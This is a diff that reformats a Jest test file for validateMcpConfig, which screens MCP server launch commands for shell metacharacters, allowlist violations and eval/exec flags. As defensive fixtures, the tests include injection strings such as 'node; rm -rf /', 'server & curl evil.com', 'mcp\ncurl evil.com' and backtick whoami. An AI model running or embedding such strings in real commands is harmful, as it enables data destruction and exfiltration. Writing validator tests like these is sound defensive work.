@@ -149,21 +149,19 @@ describe('validateMcpConfig (downstream/types)', () => {
     });
 
     it('throws when command array is missing', () => {
-      expect(() =>
-        validateMcpConfig({ name: 'test', transport: 'stdio' })
-      ).toThrow('stdio transport requires command array');
+      expect(() => validateMcpConfig({ name: 'test', transport: 'stdio' })).toThrow(
+        'stdio transport requires command array'
+      );
     });
 
     it('throws when command array is empty', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig([]))
-      ).toThrow('stdio transport requires command array');
+      expect(() => validateMcpConfig(makeStdioConfig([]))).toThrow(
+        'stdio transport requires command array'
+      );
     });
 
     it('throws when command[0] is blank', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['']))
-      ).toThrow('Empty command not allowed');
+      expect(() => validateMcpConfig(makeStdioConfig(['']))).toThrow('Empty command not allowed');
     });
 
     it('skips all checks for non-stdio transports', () => {
@@ -175,9 +173,9 @@ describe('validateMcpConfig (downstream/types)', () => {
 
   describe('SEC-FIX-001: shell metacharacter check covers all command elements', () => {
     it('throws for semicolon in command[0]', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['node; rm -rf /', 'server.js']))
-      ).toThrow('shell metacharacters');
+      expect(() => validateMcpConfig(makeStdioConfig(['node; rm -rf /', 'server.js']))).toThrow(
+        'shell metacharacters'
+      );
     });
 
     it('throws for pipe in command[1] (argument)', () => {
@@ -187,9 +185,9 @@ describe('validateMcpConfig (downstream/types)', () => {
     });
 
     it('throws for backtick in command[2]', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['npx', '-y', '`whoami`']))
-      ).toThrow('shell metacharacters');
+      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', '`whoami`']))).toThrow(
+        'shell metacharacters'
+      );
     });
 
     it('throws for dollar-sign expansion in argument', () => {
@@ -199,29 +197,29 @@ describe('validateMcpConfig (downstream/types)', () => {
     });
 
     it('throws for ampersand in argument', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['uvx', 'server & curl evil.com']))
-      ).toThrow('shell metacharacters');
+      expect(() => validateMcpConfig(makeStdioConfig(['uvx', 'server & curl evil.com']))).toThrow(
+        'shell metacharacters'
+      );
     });
 
     it('throws for newline embedded in argument', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['npx', '-y', 'mcp\ncurl evil.com']))
-      ).toThrow('shell metacharacters');
+      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', 'mcp\ncurl evil.com']))).toThrow(
+        'shell metacharacters'
+      );
     });
   });
 
   describe('SEC-FIX-002: base command allowlist', () => {
     it('throws for bash (not in allowlist)', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['bash', '-c', 'evil']))
-      ).toThrow('not in the allowed command list');
+      expect(() => validateMcpConfig(makeStdioConfig(['bash', '-c', 'evil']))).toThrow(
+        'not in the allowed command list'
+      );
     });
 
     it('throws for /bin/sh (not in allowlist)', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['/bin/sh', '-c', 'evil']))
-      ).toThrow('not in the allowed command list');
+      expect(() => validateMcpConfig(makeStdioConfig(['/bin/sh', '-c', 'evil']))).toThrow(
+        'not in the allowed command list'
+      );
     });
 
     it('throws for curl (not in allowlist)', () => {
@@ -232,30 +230,26 @@ describe('validateMcpConfig (downstream/types)', () => {
 
     it('accepts all default allowlist commands', () => {
       for (const base of DEFAULT_ALLOWED_COMMANDS) {
-        expect(() =>
-          validateMcpConfig(makeStdioConfig([base, 'safe-arg']))
-        ).not.toThrow();
+        expect(() => validateMcpConfig(makeStdioConfig([base, 'safe-arg']))).not.toThrow();
       }
     });
 
     it('accepts a custom command when MCP_ALLOWED_COMMANDS is set', () => {
       process.env['MCP_ALLOWED_COMMANDS'] = 'my-runner';
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['my-runner', 'safe-arg']))
-      ).not.toThrow();
+      expect(() => validateMcpConfig(makeStdioConfig(['my-runner', 'safe-arg']))).not.toThrow();
     });
 
     it('rejects default commands when overridden by MCP_ALLOWED_COMMANDS', () => {
       process.env['MCP_ALLOWED_COMMANDS'] = 'only-this-runner';
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['npx', '-y', 'some-mcp']))
-      ).toThrow('not in the allowed command list');
+      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', 'some-mcp']))).toThrow(
+        'not in the allowed command list'
+      );
     });
 
     it('includes MCP_ALLOWED_COMMANDS hint in error message', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['evil-cmd', 'arg']))
-      ).toThrow('MCP_ALLOWED_COMMANDS');
+      expect(() => validateMcpConfig(makeStdioConfig(['evil-cmd', 'arg']))).toThrow(
+        'MCP_ALLOWED_COMMANDS'
+      );
     });
   });
 
@@ -267,22 +261,22 @@ describe('validateMcpConfig (downstream/types)', () => {
     });
 
     it('throws for node --eval', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['node', '--eval', 'malicious()']))
-      ).toThrow('dangerous eval/exec pattern');
+      expect(() => validateMcpConfig(makeStdioConfig(['node', '--eval', 'malicious()']))).toThrow(
+        'dangerous eval/exec pattern'
+      );
     });
 
     it('throws for python3 -c (inline code)', () => {
       // -c itself triggers the dangerous arg check regardless of the payload
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['python3', '-c', 'print("hello")']))
-      ).toThrow('dangerous eval/exec pattern');
+      expect(() => validateMcpConfig(makeStdioConfig(['python3', '-c', 'print("hello")']))).toThrow(
+        'dangerous eval/exec pattern'
+      );
     });
 
     it('throws for python -c (inline code)', () => {
-      expect(() =>
-        validateMcpConfig(makeStdioConfig(['python', '-c', 'print("hello")']))
-      ).toThrow('dangerous eval/exec pattern');
+      expect(() => validateMcpConfig(makeStdioConfig(['python', '-c', 'print("hello")']))).toThrow(
+        'dangerous eval/exec pattern'
+      );
     });
 
     it('throws for argument containing eval()', () => {
@@ -378,7 +372,9 @@ describe('validateMcpConfig (downstream/types)', () => {
 
     it('accepts safe env vars', () => {
       expect(() =>
-        validateMcpConfig(makeStdioConfig(['npx', '-y', 'mcp'], { API_KEY: 'safe-value', DEBUG: '1' }))
+        validateMcpConfig(
+          makeStdioConfig(['npx', '-y', 'mcp'], { API_KEY: 'safe-value', DEBUG: '1' })
+        )
       ).not.toThrow();
     });
   });
